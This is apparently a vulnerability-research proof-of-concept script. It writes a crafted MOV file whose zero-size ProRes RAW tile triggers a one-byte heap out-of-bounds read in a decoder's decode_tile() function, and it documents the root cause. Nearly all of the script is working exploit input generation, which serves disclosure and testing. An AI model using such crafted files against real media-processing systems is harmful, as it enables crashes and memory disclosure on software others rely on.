#!/usr/bin/env python3
"""
VULN 001 PoC Generator — ProRes RAW decode_tile() heap OOB read
CWE-125: Out-of-Bounds Read

Root cause:
  decode_tile() calls bytestream2_get_byteu() twice (lines 262-263 of
  prores_raw.c) without checking whether the tile buffer has any bytes left.
  decode_frame() validates tile offsets only with upper-bound checks:
      if (offset >= avpkt->size)          → AVERROR_INVALIDDATA
      if (size >= avpkt->size)            → AVERROR_INVALIDDATA
      if (offset > avpkt->size - size)    → AVERROR_INVALIDDATA
  A tile with size=0 passes all three checks but initialises a 0-byte
  GetByteContext for the tile.  The first bytestream2_get_byteu call reads the
  byte at avpkt->data[avpkt->size-1] (last valid byte), advances the pointer to
  avpkt->data+avpkt->size, and the second call reads avpkt->data[avpkt->size] —
  one byte past the heap-allocated packet buffer.

Crafted packet (83 bytes):
  [0:4]   frame_size = 83  (BE32, must equal avpkt->size)
  [4:8]   'prrf' magic
  [8:10]  header_len = 72  (BE16; body = 70 bytes, satisfies >= 62 check)
  [10:80] header body (70 bytes: version/vendor/dims/WB/matrix/flags=0)
  [80:82] tile size table: 1 tile, size = 0  (BE16)
  [82]    one extra byte → total = 83

Trigger trace:
  offset = tell(gb) + nb_tiles*2 = 80 + 2 = 82
  tile size = 0  → passes all 3 bounds checks (0 < 83, 82 < 83, 82 == 83-0)
  bytestream2_init(&tile->gb, avpkt->data+82, 0)
    → buffer == buffer_end == avpkt->data+82
  decode_tile line 262: bytestream2_get_byteu(&tile->gb)
    → reads avpkt->data[82]  (valid, last byte of packet)
    → buffer advances to avpkt->data+83
  decode_tile line 263: bytestream2_get_byteu(&tile->gb)
    → reads avpkt->data[83]  ← HEAP OOB READ (1 past end of allocation)
"""

import struct
import os

# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

def box(tag, payload: bytes) -> bytes:
    """Build a MOV/ISO BMFF atom: 4-byte big-endian size + 4-byte tag + payload."""
    if isinstance(tag, str):
        tag = tag.encode('latin-1')
    size = 4 + 4 + len(payload)
    return struct.pack('>I4s', size, tag) + payload


# ---------------------------------------------------------------------------
# Crafted ProRes RAW packet
# ---------------------------------------------------------------------------

PACKET_SIZE = 83   # total bytes; frame_size field must match
HEADER_LEN  = 72   # >= 62 required; body = header_len - 2 = 70 bytes


def build_prores_raw_packet() -> bytes:
    """Return the 83-byte crafted ProRes RAW packet."""

    # ---- header body (70 bytes) ----------------------------------------
    hdr = bytearray()
    hdr += b'\x00'                              # reserved (1)
    hdr += b'\x00'                              # version = 0 (1)
    hdr += b'peac'                              # vendor tag (4)
    hdr += struct.pack('>HH', 16, 16)           # width=16, height=16 (4)
    hdr += b'\x00\x00\x00\x00'                 # crop l/r/t/b (4)
    hdr += struct.pack('>H', 0)                 # bayer_pattern=0 RGGB (2)
    hdr += struct.pack('>H', 0)                 # senselValueRange (2)
    hdr += struct.pack('>f', 1.0)              # WhiteBalanceRedFactor (4)
    hdr += struct.pack('>f', 1.0)              # WhiteBalanceBlueFactor (4)
    # ColorMatrix 3x3 (36 bytes) — identity (camera RGB == XYZ D65 approximation)
    color_matrix = [1.0, 0.0, 0.0,
                    0.0, 1.0, 0.0,
                    0.0, 0.0, 1.0]
    for v in color_matrix:
        hdr += struct.pack('>f', v)
    hdr += struct.pack('>f', 1.0)              # GainFactor (4)
    hdr += struct.pack('>H', 6500)             # WhiteBalanceCCT in Kelvin (2)
    hdr += struct.pack('>H', 0)                 # flags = 0: no qmat, no lin_curve (2)
    # -------------------------------------------------------------------
    assert len(hdr) == HEADER_LEN - 2, (
        f"Header body length mismatch: got {len(hdr)}, expected {HEADER_LEN - 2}")

    pkt = bytearray()
    pkt += struct.pack('>I', PACKET_SIZE)       # frame_size (4) — must equal avpkt->size
    pkt += b'prrf'                              # ProRes RAW frame magic (4)
    pkt += struct.pack('>H', HEADER_LEN)        # header_len (2)
    pkt += hdr                                  # header body (70)
    # Tile size table: 1 tile with size = 0
    pkt += struct.pack('>H', 0)                 # tile[0].size = 0 — vulnerability trigger (2)
    pkt += b'\x00'                              # 1 padding byte → total = 83
    # -------------------------------------------------------------------
    assert len(pkt) == PACKET_SIZE, (
        f"Packet length mismatch: got {len(pkt)}, expected {PACKET_SIZE}")

    return bytes(pkt)


# ---------------------------------------------------------------------------
# MOV atom builders
# ---------------------------------------------------------------------------

def build_ftyp() -> bytes:
    payload  = b'qt  '                          # major brand
    payload += struct.pack('>I', 0)             # minor version
    payload += b'qt  '                          # compatible brand
    return box('ftyp', payload)


def build_mvhd() -> bytes:
    payload  = struct.pack('>I', 0)             # version(0) + flags(0)
    payload += struct.pack('>II', 0, 0)         # creation / modification time
    payload += struct.pack('>I', 25)            # timescale = 25
    payload += struct.pack('>I', 1)             # duration = 1 tick
    payload += struct.pack('>I', 0x00010000)    # rate = 1.0 (16.16 fixed)
    payload += struct.pack('>H', 0x0100)        # volume = 1.0 (8.8 fixed)
    payload += b'\x00' * 10                    # reserved
    # 3×3 identity matrix (9 × 4-byte fixed-point 16.16 / 2.30)
    payload += struct.pack('>9I',
        0x00010000, 0x00000000, 0x00000000,
        0x00000000, 0x00010000, 0x00000000,
        0x00000000, 0x00000000, 0x40000000)
    payload += b'\x00' * 24                    # pre-defined (6 × uint32)
    payload += struct.pack('>I', 2)             # next_track_id
    return box('mvhd', payload)


def build_tkhd() -> bytes:
    payload  = struct.pack('>I', 0x00000003)    # version(0) + flags: enabled|in-movie
    payload += struct.pack('>II', 0, 0)         # creation / modification time
    payload += struct.pack('>I', 1)             # track_id = 1
    payload += struct.pack('>I', 0)             # reserved
    payload += struct.pack('>I', 1)             # duration = 1 tick
    payload += b'\x00' * 8                     # reserved
    payload += struct.pack('>HH', 0, 0)         # layer, alternate_group
    payload += struct.pack('>HH', 0, 0)         # volume (0 for video), reserved
    payload += struct.pack('>9I',               # identity matrix
        0x00010000, 0x00000000, 0x00000000,
        0x00000000, 0x00010000, 0x00000000,
        0x00000000, 0x00000000, 0x40000000)
    payload += struct.pack('>II',
        16 << 16,                               # width  in 16.16 fixed
        16 << 16)                               # height in 16.16 fixed
    return box('tkhd', payload)


def build_mdhd() -> bytes:
    payload  = struct.pack('>I', 0)             # version(0) + flags(0)
    payload += struct.pack('>II', 0, 0)         # creation / modification time
    payload += struct.pack('>I', 25)            # timescale = 25
    payload += struct.pack('>I', 1)             # duration = 1 tick
    payload += struct.pack('>H', 0x15C7)        # language "und"
    payload += struct.pack('>H', 0)             # pre-defined
    return box('mdhd', payload)


def build_hdlr() -> bytes:
    payload  = struct.pack('>I', 0)             # version(0) + flags(0)
    payload += struct.pack('>I', 0)             # pre-defined
    payload += b'vide'                          # handler_type
    payload += b'\x00' * 12                    # reserved (3 × uint32)
    payload += b'VideoHandler\x00'              # name (null-terminated)
    return box('hdlr', payload)


def build_vmhd() -> bytes:
    payload  = struct.pack('>I', 1)             # version(0) + flags=1
    payload += struct.pack('>H', 0)             # graphicsMode = copy
    payload += b'\x00' * 6                     # opcolor
    return box('vmhd', payload)


def build_dinf() -> bytes:
    # Self-contained data reference (url  with self-contained flag = 0x000001)
    url_payload  = struct.pack('>I', 1)         # version(0) + flags=1 (self-contained)
    url_entry    = box('url ', url_payload)
    dref_payload  = struct.pack('>I', 0)        # version(0) + flags(0)
    dref_payload += struct.pack('>I', 1)        # entry_count = 1
    dref_payload += url_entry
    dref = box('dref', dref_payload)
    return box('dinf', dref)


def build_video_sample_entry(codec_tag: str, width: int, height: int) -> bytes:
    """VisualSampleEntry as defined in ISO 14496-12 §12.1.3."""
    payload  = b'\x00' * 6                     # reserved
    payload += struct.pack('>H', 1)             # data-reference-index = 1
    payload += struct.pack('>H', 0)             # pre-defined
    payload += struct.pack('>H', 0)             # reserved
    payload += b'\x00' * 12                    # pre-defined (3 × uint32)
    payload += struct.pack('>HH', width, height)
    payload += struct.pack('>I', 0x00480000)    # horiz resolution 72 dpi
    payload += struct.pack('>I', 0x00480000)    # vert  resolution 72 dpi
    payload += struct.pack('>I', 0)             # reserved
    payload += struct.pack('>H', 1)             # frame_count = 1
    payload += b'\x00' * 32                    # compressor name (Pascal string)
    payload += struct.pack('>H', 0x0018)        # depth = 24
    payload += struct.pack('>h', -1)            # pre-defined = -1
    tag = codec_tag.encode('latin-1') if isinstance(codec_tag, str) else codec_tag
    size = 4 + 4 + len(payload)
    return struct.pack('>I4s', size, tag) + payload


def build_stsd(width: int, height: int) -> bytes:
    entry    = build_video_sample_entry('aprh', width, height)
    payload  = struct.pack('>I', 0)             # version(0) + flags(0)
    payload += struct.pack('>I', 1)             # entry_count = 1
    payload += entry
    return box('stsd', payload)


def build_stts() -> bytes:
    payload  = struct.pack('>I', 0)             # version(0) + flags(0)
    payload += struct.pack('>I', 1)             # entry_count = 1
    payload += struct.pack('>II', 1, 1)         # sample_count=1, sample_delta=1
    return box('stts', payload)


def build_stsc() -> bytes:
    payload  = struct.pack('>I', 0)             # version(0) + flags(0)
    payload += struct.pack('>I', 1)             # entry_count = 1
    payload += struct.pack('>III', 1, 1, 1)     # first_chunk / samples_per_chunk / sdi
    return box('stsc', payload)


def build_stsz(sample_size: int) -> bytes:
    payload  = struct.pack('>I', 0)             # version(0) + flags(0)
    payload += struct.pack('>I', 0)             # uniform sample_size = 0 (use table)
    payload += struct.pack('>I', 1)             # sample_count = 1
    payload += struct.pack('>I', sample_size)   # entry
    return box('stsz', payload)


def build_stco(chunk_offset: int) -> bytes:
    payload  = struct.pack('>I', 0)             # version(0) + flags(0)
    payload += struct.pack('>I', 1)             # entry_count = 1
    payload += struct.pack('>I', chunk_offset)  # absolute file offset of chunk 0
    return box('stco', payload)


def build_stbl(width: int, height: int, sample_size: int, chunk_offset: int) -> bytes:
    return box('stbl',
               build_stsd(width, height) +
               build_stts() +
               build_stsc() +
               build_stsz(sample_size) +
               build_stco(chunk_offset))


def build_minf(width: int, height: int, sample_size: int, chunk_offset: int) -> bytes:
    return box('minf',
               build_vmhd() +
               build_dinf() +
               build_stbl(width, height, sample_size, chunk_offset))


def build_mdia(width: int, height: int, sample_size: int, chunk_offset: int) -> bytes:
    return box('mdia',
               build_mdhd() +
               build_hdlr() +
               build_minf(width, height, sample_size, chunk_offset))


def build_trak(width: int, height: int, sample_size: int, chunk_offset: int) -> bytes:
    return box('trak',
               build_tkhd() +
               build_mdia(width, height, sample_size, chunk_offset))


def build_moov(width: int, height: int, sample_size: int, chunk_offset: int) -> bytes:
    return box('moov',
               build_mvhd() +
               build_trak(width, height, sample_size, chunk_offset))


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------

def main():
    out_dir  = os.path.dirname(os.path.abspath(__file__))
    out_path = os.path.join(out_dir, 'vuln_001_input.mov')

    width, height = 16, 16
    pkt         = build_prores_raw_packet()
    sample_size = len(pkt)   # 83 bytes

    ftyp = build_ftyp()

    # First pass: build moov with placeholder offset to measure its size
    moov_placeholder = build_moov(width, height, sample_size, 0)
    ftyp_size  = len(ftyp)
    moov_size  = len(moov_placeholder)

    # mdat box header = 4 (size) + 4 ('mdat') = 8 bytes
    # chunk data starts immediately after the mdat header
    chunk_offset = ftyp_size + moov_size + 8

    # Second pass: rebuild moov with the correct stco chunk offset
    moov = build_moov(width, height, sample_size, chunk_offset)
    assert len(moov) == moov_size, \
        f"moov size changed between passes: {moov_size} → {len(moov)}"

    mdat = box('mdat', pkt)
    mov  = ftyp + moov + mdat

    with open(out_path, 'wb') as f:
        f.write(mov)

    # ---- diagnostic output -----------------------------------------------
    print(f"[+] Written {len(mov)} bytes → {out_path}")
    print(f"    ftyp  : offset=0,            size={ftyp_size}")
    print(f"    moov  : offset={ftyp_size},      size={moov_size}")
    print(f"    mdat  : offset={ftyp_size+moov_size}, size={len(mdat)}")
    print(f"    chunk_offset (stco) : {chunk_offset}")
    print(f"    ProRes RAW packet   : {sample_size} bytes")
    print(f"    Tile size=0; tile->gb.buffer = pkt+82 (size=0)")
    print(f"    line 262 reads pkt[82]  (valid, last byte)")
    print(f"    line 263 reads pkt[83]  ← HEAP OOB READ")


if __name__ == '__main__':
    main()
